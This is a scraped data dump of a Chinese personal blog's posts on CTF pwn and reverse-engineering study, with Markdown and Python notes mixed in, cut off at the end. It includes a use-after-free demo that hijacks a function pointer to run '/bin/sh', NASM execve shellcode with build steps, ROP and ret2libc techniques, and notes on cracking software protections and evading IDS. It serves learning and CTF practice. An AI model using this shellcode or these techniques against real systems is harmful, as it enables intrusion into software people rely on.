free)利用学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，只能看了下pwn的tips，开始现学现卖。 原理就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。 根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。 漏洞的简单利用1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);void evil_fuc(char command[])&#123;system(command);&#125;void echo(char content[])&#123;printf(&quot;%s&quot;,content);&#125;int main()&#123; func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(&quot;malloc addr: %p\\n&quot;,p1); p1[3]=echo; p1[3](&quot;hello world\\n&quot;); free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p1[3](&quot;hello again\\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态 func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来. printf(&quot;malloc addr: %p\\n&quot;,p2); printf(&quot;malloc addr: %p\\n&quot;,p1);//p2与p1指针指向的内存为同一地址 p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针. p1[3](&quot;/bin/sh&quot;); return 0;&#125; 最终运行效果： to 漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程 学习借鉴文章来源：https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn1.2","slug":"Introduction to pwn 1.2","date":"2018-08-28T01:46:58.000Z","updated":"2019-07-13T03:02:29.167Z","comments":true,"path":"2018/08/28/Introduction to pwn 1.2/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/Introduction to pwn 1.2/","excerpt":"","text":"静态链接ret2text &amp; ret2shellcode当程序中存在打印flag的地址或是可以得到shell的地址，我们就可以想办法覆盖返回地址到其地址处。也就是ret2text. 若程序中有明显的溢出且无保护措施，我们可以自己写shellcode并覆盖返回地址至shellcode处改变程序流程。不过要注意写入shellcode的区域要有可执行权限，否则写了也白写。关于shellcode的布置可以查看shellcode的布置 查看程序段的可读写执行情况： gdb：vmmap ./file &amp; (后台运行，返回pid0） cat /proc/pid0/maps ret2syscall栈不可执行开启的情况下，我们可以在栈上写入gadgets，使通过系统中断执行系统调用，从而达到获取shell的目的； 查找gadget的方法： ROPgadget --binary ./file ROPgadget --binary file --only &apos;pop|ret&apos; | grep eax ROPgadget --binary file --opcode cd80c3（int 0x80 ; ret ） ROPgadget --binary file --string &apos;/bin/sh&apos; 32位linux下的系统调用.64位linux下的系统调用. 动态链接ret2libc程序不是静态编译，通常就不会有int 0x80; ret2syscall 就无法实现，因而使用ret2libc。 利用过程：ASLR使得每次载入的函数地址（base）都不同；实际地址 Address = base +offset 若地址为 0xf… 则其一般为实际地址； 而各函数offset在libc库中是固定的； 查看libc库版本： 1ldd ./file 寻找偏移地址 ： 1readelf -a /lib32/libc.so.6 | grep gets@ 目标是寻找libc 的 base : 1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset 2.从stack残渣中获取libc地址信息 延迟绑定简而言之就是程序在未调用过该函数时，其got地址处的值不是其真实地址；当程序调用一次该函数后，真实地址才会被初始化，此时got地址处的值才是真实地址。 给文件加载目标libc的方法： 加载环境变量:(64为UBUNTU调试32位程序会无法加载) 1234export LD_LIBRARY_PATH=`pwd` #当前目录为加载目录export LD_PRELOAD= libc #加载本地pwn题目下的libcunset LD_PRELOAD #调试完删除环境变量 exp调试时使用 1sh = process([‘./bin‘],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;) 需要注意的函数read 读取截至\\x00，\\n不会自动忽略gets writeputs 截止符为\\x00，没有截断可以泄露，最后会自动加上\\n 源码级别的调试glibc 源码下载：http://mirrors.ustc.edu.cn/gnu/libc/ 下载源码， tar解压 进入源码文件，mkdir build ; cd build 12345CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; ../configure --prefix=/home/sirius/tools/source/glibc-2.23/64make -j8sudo make install 在程序编译时可以直接更改ld为编译完的libc，这样在调试时可以直接调用编译出来的libc，也就可以直接调试源码。 调试源码除了使用gdb以外，更方便的方法就是使用linux 下的vscode，可以像windows下一样直接对源码进行调试。 当然也可以使用gdbtui，但是不是特别的好用，加了pwndbg插件后显示会出现乱码。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"软件保护/软件破解 及对抗","slug":"软件保护-软件破解-及对抗","date":"2018-08-25T01:30:41.000Z","updated":"2018-09-26T12:34:49.108Z","comments":true,"path":"2018/08/25/软件保护-软件破解-及对抗/","link":"","permalink":"http://siriuswhiter.tk/2018/08/25/软件保护-软件破解-及对抗/","excerpt":"","text":"软件保护简单算法注册保护：输入用户名序列号，计算并检测序列号； 简单算法注册保护的对抗：①修改关键指令：暴力破解；patcher②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机③还原本身算法；keygen 复杂算法注册保护：通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等； 复杂算法注册保护的对抗：①patch②补丁修改公钥，使用自己的公钥对； 网络加密及硬件加密：本质上与本地加密相同/运行前检测？？ 网络加密及硬件加密的对抗：①patch②模拟与远程端的通信，及模拟执行；③使用中转程序，从服务器获得远程执行结果； 复杂系统注册保护：以上内容混杂 附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测 软件破解及对抗程序分析及对抗： 代码变形mutation； 代码膨胀expansion； 花指令； 代码乱序； 平坦化； 程序调试及对抗： 系统API检测程序是否处于被调试状态； 检测调试器窗口信息、状态码； 检测调试器驱动，符号； 程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）； 利用驱动接管本身程序的中断，阻止被调试器接管； 利用驱动修改内核参数，阻止程序被调试； 双进程反调试； 程序修改及对抗：修改：文件补丁技术及工具；对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等； dnspy：.NET程序逆向工具","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"Hexo Essay Writing","slug":"hexo-essay-writing","date":"2018-08-15T15:33:24.000Z","updated":"2019-05-30T09:06:46.983Z","comments":true,"path":"2018/08/15/hexo-essay-writing/","link":"","permalink":"http://siriuswhiter.tk/2018/08/15/hexo-essay-writing/","excerpt":"","text":"打开git,进入MyBlog目录； 输入 hexo new &quot;essay-name&quot;； 打开source文件夹，找到 essay-name.md，使用markdown语法写作； 执行命令 / hexo clean / hexo generate/ hexo deploy(简单点： hexo clean &amp;&amp; hexo g &amp;&amp; hexo d)； over； 假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"Markdown standard","slug":"markdown规范学习","date":"2018-08-13T14:46:46.000Z","updated":"2018-09-25T13:48:48.888Z","comments":true,"path":"2018/08/13/markdown规范学习/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/markdown规范学习/","excerpt":"","text":"MarkDown v1.01.1 全局规范 MarkDown 文件使用‘.md’结尾 （小写字母) 格式规范标题结构格式1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开2.’#’号和文字之间’一个空格’连接3.标题层级最多六级 ‘#’到’######’ 加强和强调规范一般统一使用第一种 12*emphasize*_emphasize_ 使用’~~’给文字添加删除线1~~strikethrough~~ 代码块规范 行内代码使用’一对波浪号’如：hello world! 块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下： 123&lt;?php echo &apos;看源码之三个波浪号&apos;;?&gt; &lt;?php echo &apos;看源码之四空格缩进&apos;; ?&gt; 列表写法 列号’1.’或者’*’后内容用空格隔开 列表块前后’整行隔开’ 如下： 1234561. Windows 2. Mac3. iOS * iPhone * iPad4. Android 实际预览： Windows Mac iOS iPhone iPad Android 123456* Windows * Mac* iOS* Android 1. v3.2 2. v4.1 实际预览： Windows Mac iOS Android v3.2 v4.1 其他标签规范链接和email Inline： 1An [example](http://url.com/ &quot;title&quot;) 实现效果：An example 引用样式标签（titles are optional）: An [example][id].Then,anywhere else in the doc,define the link: [id]:http://example.com/ &quot;title&quot; Email: 1An email &lt;example@example.com&gt; link. 插图Inline(titles are optional)： 1![alt text](/path/img.jpg &quot;title&quot;) 引用式插图： ![alt text][id] [id]:/url/to/img.jpg &quot;title&quot; 引用块及嵌套 Email-style angle bracketsare used for blockquotes. And, they can be nested. Headers in blockquotes You can quote a list. Etc. 内联代码 &lt;code&gt; 段落中的用法 也可以 `代码中包含波浪号`.代码块 Indent every line of a code block by at least 4 spaces or 1 tab.代码的每行都最少用4个空格或者一个制表符(tab) 我是普通文本块 我是一个预格式化的 代码块. 水平分割线三个连字符-: 表格规范一个简单的表格看起来如下： 第一个头部 第二个头部 第三个头部 内容格子 内容格子 内容格子 内容格子 内容格子 内容格子 每列的对齐可以通过在分割线上添加冒号来实现： 第一个头部 第二个头部 第三个头部 左对齐 居中 右对齐 左对齐 居中 右对齐 页内锚标记 点我跳转到顶部 // 利用 #,## 生成 id 锚标签 另一种锚标记 // 利用 &lt;a name=&quot;top&quot;&gt;&lt;/a&gt; 附：参考 Hello-World.md 源码，注意换行的使用 123456789101112131415# Hello-World这是一个范例文件格式我是普通换行## 我是&lt;h2&gt;标题我是`&lt;h2&gt;`的内容## 我是&lt;h3&gt;标题* Windows * Mac* iOS* Android","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"Introduction to pwn1.1","slug":"Introduction to pwn 1.1","date":"2018-08-13T14:35:13.000Z","updated":"2019-05-24T10:06:34.624Z","comments":true,"path":"2018/08/13/Introduction to pwn 1.1/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/Introduction to pwn 1.1/","excerpt":"","text":"各种变量的存储位置 stack：局部变量 heap: 动态分配内存的变量（malloc/new） bss section: 全局化的未初始化的变量 data section: 全局化的已初始化的变量 rodata: （只读data段）全局化的静态变量（const） 例如： 123456789int a = 0; //.dataint b; //.bssconst double PI = 3.1415 //rodataint main()&#123; int c = 2; //stack char *d = malloc(16); //heap return 0;&#125; linux下将shellcode运行1.手写简易shellcode 123456789101112jmp shrun: pop ebx mov BYTE [ebx+7],0 xor eax,eax mov al,11 xor ecx,ecx xor edx,edx int 0x80sh: call run db &quot;/bin/sh&quot; 2.一系列步骤 123Assembly: nasm a.asm -o a.o -felf32 Extract Shellcode: objcopy -O binary a.o code //将a.o中需要用内容的提取到code中 xxd -i code //将提取出来的code转换为机器码 3.带入调用shellcode的程序test.c #include &quot;code.h&quot; typedef int(*CODE)(); int main() { ((CODE)shellcode)(); } Run Shellcode: gcc test.c -o test -m32 -zexexstack 编译tips64位机上编译上面程序需要强制32位编译，用gcc -m32 、as –32选项 AT&amp;T：as easy.s -o easy.o –32ld easy.o -o easy -m elf_i386 INTEL:nasm srop.asm -f elf64ld -m elf_x86_64 srop.o -o srop","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Learning python","slug":"learning-python","date":"2018-08-02T11:11:04.000Z","updated":"2018-09-25T13:43:58.748Z","comments":true,"path":"2018/08/02/learning-python/","link":"","permalink":"http://siriuswhiter.tk/2018/08/02/learning-python/","excerpt":"","text":"最近将之前的博客逐渐搬运过来，因为可怜的服务器要到期了hhh 为了能够完成各色python脚本的编写，迫不得已入门python大法！ 以下为简易的py语法： Python string 对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符； eg： ord(‘A’) -&gt;65 chr(66) -&gt;B 对bytes类型的数据用带b前缀的单引号或双引号表示： x=b’abc’； 可以通过encode() 将Unicode表示的str编码为指定的 bytes； 格式化输出字符串： c语言格式； format 方法’aaaa{0}bbbb{1}cccccc……’.format(para1,para2…)参数会依次取代占位符{0} {1}{…}； python list and tuple list（列表） ：classmates = [‘elementl’, ‘element2’, [‘element31’,’element32’],’element4’] len()得到元素个数； classmates[-n]可以得到倒数第n个元素； classmates.append(‘element’)追加元素到末尾； insert(n,’element’)插入到指定位置； pop()删除末尾元素；pop(i)删除指定位置元素； classmates[n]=’element’直接替换为别的元素； list元素可以是另一个list。 tuple（元组）： classmates = (‘elementl’, ‘element2’, (‘element31’,’element32’),’element4’) 一旦初始化就不能修改（每个元素指向不变），一定程度上相当于const； 获取元素方法与list相同； 当只有一个元素时 t=(1,) 需要使用’，’来消除歧义； tuple中包含list元素时，list中的元素可以变，因为对tuple来说其指向并没有改变。 python dic （同c++map） d = {‘key1’: value1, ‘key2’: value2, ‘key3’: value3} =&gt; d[‘key1’] -&gt;value1 为避免key不存在： ‘key’ in d 不存在则返回False； d.get(‘key’,value) 不存在则返回value； pop(key)可以删除key即对应的value。 python set set也是一组key的集合但不储存value；key不能重复。 创建set需要提供一个list作为输入集合 s = set([1,2,3]); add(key)添加key ；remove(key)删除key。 1234567891011和list比较，dict有以下几个特点： 查找和插入的速度极快，不会随着key的增加而变慢； 需要占用大量的内存，内存浪费多。而list相反： 查找和插入的时间随着元素的增加而增加； 占用空间小，浪费内存很少。所以，dict是用空间来换取时间的一种方法。 python loop for i in list/tuple: 把list或tuple中的每个元素带入i，执行之后缩进块的语句； range()函数可以生成一个整数序列，list(range(n))可以将其转化为list； while xxx： break / continue 同c。 python func 空函数：pass用来做占位符，让代码格式正确。 可以返回多个值，实质上是返回的tuple； None 为不变对象，需要时可以将函数的参数定义为不变对象，这样在每次调用时都是从初始定义的变量开始。（即python函数参数变量默认等于c语言的static，加上none可以去掉static） 12345#Python2.7在一行输入多个数字的方法： 输入一个数字 m = int(raw_input())输入多个数字是 m, n,.... = map(int, raw_input().split()) 可变参数： 函数 def funcname(‘*’args):定义一个参数数量不定的list/tuple L, 调用funcname(L)即可； 关键字参数：函数def funcname(a,b,’‘’‘kw):c为关键字参数（例如用户注册 ab为必填项 c为选填项）；调用时funcname(A,B,e=E,f=F); 命名关键字参数：函数def funcname(a,b,’‘,c,d):’‘后面为命名关键字参数，即选填项只能是定义的key；也可以是 def funcname(a,b,’‘,c,d，e):可变参数c后面的命名关键字参数不必再加’*’；对于前者，调用时funcname(A,B,c=C,d=D); python slice用于取一个list或tuple的部分元素:L = [‘element1’, ‘element2’, ‘element3’, ‘element4’, ‘element5’] slice操作符使用： eg：取前三个元素 L[0:3] /L[:3]；取后两个元素L[-2:]；取倒数第二个元素L[-2:-1]； L[:10:2]前十个数里每两个取一个；L[::5]所有数每五个取一个； python iteration即循环遍历； d = {‘a’: 1, ‘b’: 2, ‘c’: 3} eg: 循环迭代dict： for key in d://默认dict 迭代的是key ；迭代value : for value in d.values()；同时迭代 ：for k,v ind.items() 判断是否可迭代：通过collections模块的Iterable类型判断 12 from collections import Iterable isinstance(objects,Iterable) 下标循环的实现：通过内置的enumerate函数判断 1for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]): python list generationeg： 生成L=[1,4,9,….100]：[x*x for x in range(1,100)]; 筛选出仅偶数的平方：[x*x for x in range(1,100) if x%2 ==0]; 两层循环生成全排列：[m+n for m in &#39;ABC&#39; for n in &#39;DEF&#39; ]; 列出当前目录下所有文件即目录名：import os | [d for d in os.listdir(&#39;.&#39;)]; 把一个list L 中所有字符串变为小写：[s.lower() for s in L]; python genarator不必创建完整的list，节省大量空间；边循环边计算，称为生成器generator； 方法：将列表生成式的[]改为()即可；","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"The art 0f deploying shellcode","slug":"the-art-0f-deploying-shellcode","date":"2018-07-26T11:46:22.000Z","updated":"2018-09-25T13:43:49.802Z","comments":true,"path":"2018/07/26/the-art-0f-deploying-shellcode/","link":"","permalink":"http://siriuswhiter.tk/2018/07/26/the-art-0f-deploying-shellcode/","excerpt":"","text":"转移自之前的博客 shellcode布置 将shellcode放在缓冲区中（静态地址），即函数返回地址之前。//shellcode自身可能会被压栈数据破坏，难以动态定位 1 使用jmp esp/call esp 指令作为跳板指令，定位shellcode，使shellcode正好布置在返回地址之后。//前栈帧数据被大范围破坏 2 为尽量避免1,2的缺点，可以使用跳转指令定位shellcode，同时将shellcode布置在缓冲区内。 3 为了使shellcode具有通用性/安全性，通常会在shellcode一开始大范围抬高栈顶，保护自身代码的完整性。 2 某些情况下不允许使用跳板指令，静态地址又不够准确。可以淹没大片内存的情况下，将shellcode布置在一大段nop之后。此时定位shellcode时，只要能够跳进一大片nop之中即可。 2 返回地址距离缓冲区偏移量不确定。若函数返回地址按双字节不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要有其中一个可以成功覆盖，shellcode就能执行。（待理解） 2 按字节错位引起定位失败从而使shellcode无效。使用按字节相同的双字跳转地址，甚至使用堆中的地址，将shellcode用堆扩展的方法放置在相应区域（Heap spray）。（待理解） 2 2 shellcode的编码技术 原因： 所有的字符串函数都会对NULL字节进行限制，通常需要在shellcode中选择特殊的指令避免直接出现NULL字节或字。 有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。 基于特征的IDS系统往往会对常见的shellcode进行拦截。 2 2 解决： 编码。先编码使内容达到限制的要求，再构造解码程序放在shellcode开始执行的地方。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"What's PE files?","slug":"what-s-pe-files","date":"2018-07-23T10:29:37.000Z","updated":"2019-03-24T06:48:13.686Z","comments":true,"path":"2018/07/23/what-s-pe-files/","link":"","permalink":"http://siriuswhiter.tk/2018/07/23/what-s-pe-files/","excerpt":"","text":"转移自之前的博客 judge PE简单的判断文件是否为pe文件： pe 指纹： 开头为 4D 5A （MZ）； 3C 处为一个值 ； 查找该值的地址为 50 45（PE）。 PE 文件概论PE（portable Executable）windows系统下的可执行文件格式 1 . 32位可执行文件-PE32 ； 64位可执行文件-PE+/PE32+ ，是PE文件的扩展形式。 分类：可执行系列 exe scr ；库系列 dll ocx cpl drv ；驱动程序系列 sys vxd ；对象文件系列 obj （唯一不可执行）。 基本结构 1 DOS头到节区头是PE的头部分； 文件中使用偏移offset，内存中使用VA（virtual address 虚拟地址）表示位置； VA指进程虚拟内存的绝对地址，RVA指从某个基准位置开始的相对地址。 RVA+ImageBase=VA PE头(1)DOS部分 2 DOS头：IMAGE_DOS_HEADER结构体 –0x40个字节 12 3 12e_magic:DOS签名（4D5A 签名值MZ）e_lfanew:指示NT头的偏移（小端序标识法） DOS存根（stub） –可选项，大小不固定/DOS环境才会执行 PE文件头部分 NT头： IMAGE_NT_HEADERS结构体 –32位：0xF8个字节。64位： 0x108 4 123签名（50450000）标准PE header： 20个字节可选头。 标准PE header：IMAGE_FILE_HEADER结构体 5 该结构体重要成员（设置不正确，程序无法运行） 6 7 8 可选头： IMAGE_OPTIONAL_HEADER32 9 （PE头结构体中最大的） 重要成员 10 11 12 节区头： IMAGE_SECTION_HEADER 13 不同内存属性访问权限：code rwx /data rw /resource r 14 重要成员 PE头(2) 内存地址与文件偏移间的映射：RVA to RAW（即file offset） 公式：RAW - PointerToRawData = RVA -VirtualAddress RAW = RVA -VirtualAddress + PointerToRawData 15 eg： RVA = 5000 位于第一节区（.text），VA = 1000（该节区内存的的起始地址）， PointerToRawData= 400 （该节区文件的起始地址） 。 RAW = 5000 -1000 +400 =4400. DLL（动态链接库） 不把库包含在程序中，而是单独组成DLL文件，需要时调用即可/更新库时只需要替换DLL文件即可/内存映射使加载后的DLL代码，资源在多个进程中实现共享。 Windows版本不同，环境不同，被调用函数的位置（地址）也不相同。 为了确保在所有环境中都能正常调用被调用函数，编译器保存了被调用函数实际地址的位置。PE装载器将被调用函数的地址写到该位置。 DLL重定位。DLL的ImageBase默认为1000000，若某个程序使用a.dll与b.dll时，a已被装载到内存的10000000处，PE装载器只能查找其他空白的内存空间，将b装载进去。 PE头表示地址用RVA 而不是VA。 3.IAT（Import Address Table 导入地址表）：用来记录程序正在使用库中的哪些函数。","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"diary-20180720","slug":"diary-20180720","date":"2018-07-20T05:30:16.000Z","updated":"2018-10-18T10:02:47.306Z","comments":true,"path":"2018/07/20/diary-20180720/","link":"","permalink":"http://siriuswhiter.tk/2018/07/20/diary-20180720/","excerpt":"","text":"转移自之前的博客或许是因为复习时不怎么使用虚拟机，导致网络的某些配置出现了问题，按照网上的各种方法怎么也搞不好，历经小半天，终于解决。方法如下： 1.到根目录下/etc/network找到interfaces文件 2. vi打开：vi interfaces 此时发现，只有两行： 12auto loiface lo inet loopback 之所以不能联网是因为这个文件不完整。 讲这两行替换为： 123456789101112auto loiface lo inet loopbackauto eth0iface eth0 inet dhcpauto eth1iface eth1 inet dhcpauto eth2iface eth2 inet dhcpauto ath0iface ath0 inet dhcpauto wlan0iface wlan0 inet dhcp 3.退出vi，启动项 /etc/init.d/networking，重启网络连接sudo /etc/init.d/networking restart，就ok了","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"diary-20180517","slug":"diary-20180517","date":"2018-05-17T10:03:55.000Z","updated":"2018-12-05T14:31:45.783Z","comments":true,"path":"2018/05/17/diary-20180517/","link":"","permalink":"http://siriuswhiter.tk/2018/05/17/diary-20180517/","excerpt":"","text":"转移自之前的博客kali在昨天晚上未更新完卡顿，为了睡觉，强制关机(这个真的不是好习惯，未来还会在在这上面栽跟头…）；then，今天开机时在用户名与密码之间无限循环； 寻求各色解法，e.g. vi /etc/profile 但是其文件正常，之后终于在误打误撞中解决。 步骤： (1).png (2).png 进入 recovery mode（也就是纯命令行模式） 输入用户密码 按理说 应该继续 apt-get update -f 但会提示 输入 dpkg –configure -a 完成后重新update 就ok啦 2018-12-5 试着换了几个其他版本的linux，结果都不太合心意，最后还是回去修复了有些问题的gdb，暂时放弃了pwndbg的安装kali 设定开机自动运行sh脚本方式不太一样，记在这里： Debian定义了多个运行级别脚本，分别存放在/etc/rc0.d至/etc/rc6.d中，默认级别为5. 要增加开机自动运行脚本的方法如下： 1vi /etc/init.d/rc.local 写入你需要运行的脚本，:wq退出，这里我将自己的脚本放到/usr/local/bin下，然后在rc.local下指定脚本路径：./usr/local/bin/automount，注意要给脚本执行权限，rc.local中也要加入点’ . ‘来执行脚本。 123chmod +x /etc/init.d/rc.local #增加脚本执行权限update-rc.d rc.local start 99 2 3 4 5 . stop 01 0 1 6 . #设置启动级别 若要删除脚本的启动级别运行如下命令 1update-rc.d -f rc.local remove","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Introduction to pwn0.0 --Protection technology","slug":"protection-technology","date":"2018-05-13T12:11:03.000Z","updated":"2018-09-25T13:42:56.132Z","comments":true,"path":"2018/05/13/protection-technology/","link":"","permalink":"http://siriuswhiter.tk/2018/05/13/protection-technology/","excerpt":"","text":"转移自之前的博客 NX保护和DEP保护两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限 NX保护NX保护，全称为 “No eXecute” ，意为 [禁止执行]我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。 linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。 DEP保护DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护 数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码 主要优点我觉得这种保护技术组要应用于Windows 这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。百度百科上有这样一句话： 可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。 *P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。 Linux Canary保护Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：溢出栈缓冲区劫持方式 1 如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下： 1 攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。 注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。 ASLR地址空间布局随机化ASLR ，全称为 Address space layout randomization顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。 但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。 关于这个，多的我也说不上来，给几个文章的地址吧。 PIEPIE ，全称为 position-independent executables一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。 内存地址随机化机制，有以下三种情况： 1234参数 意义0 表示关闭进程地址空间随机化1 表示将mmap的基址，stack和vdso页面随机化2 表示在1的基础上增加栈（heap）的随机化 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。 FORTIFY这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。 系统防护（全）：二进制的保护机制WINDOWS和LINUX的内存防护机制","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"JavaScript Naughts and 